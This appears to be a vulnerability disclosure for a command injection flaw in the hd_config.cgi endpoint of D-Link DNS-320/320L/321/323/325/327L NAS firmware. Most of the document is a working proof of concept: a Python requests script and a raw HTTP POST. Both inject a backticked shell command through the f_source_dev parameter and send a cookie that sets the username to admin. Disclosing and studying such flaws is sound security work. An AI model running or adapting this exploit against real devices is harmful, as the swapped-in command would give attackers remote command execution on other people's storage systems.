# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)
# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_FMT_R12R5_1st_DiskMGR function of the file /cgi-bin/hd_config.cgi.  The variable `f_source_dev`is passed from a POST request and is assigned to `v3` via the `sprintf` function at line 25 and invoked by the `system` command, it can lead to command execution. 
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723736336859-34e35f81-a523-4b42-9291-58eb430fa8ab.png#averageHue=%23fbfbfa&clientId=u4315ec68-5721-4&from=paste&height=284&id=u4f9fea3f&originHeight=284&originWidth=1142&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54019&status=done&style=none&taskId=u3b9523a6-075d-4ce6-b0c6-e93b8235b3a&title=&width=1142)
# POC
```java
import requests

url = "http://192.168.0.32/cgi-bin/hd_config.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_FMT_R12R5_1st_DiskMGR&f_volume_name=1&f_source_dev=`touch+/tmp/131`&f_file_system=1&f_newly_dev=1"
response = requests.post(url, headers=headers, data=data)
print(response.text)
```

```java
POST /cgi-bin/hd_config.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 120
Origin: http://192.168.0.32
Connection: close
Referer: http://192.168.0.32/photo_center/index.html
Cookie: username=admin
Priority: u=1

cmd=cgi_FMT_R12R5_1st_DiskMGR&f_volume_name=1&f_source_dev=`touch+/tmp/131`&f_file_system=1&f_newly_dev=1
```
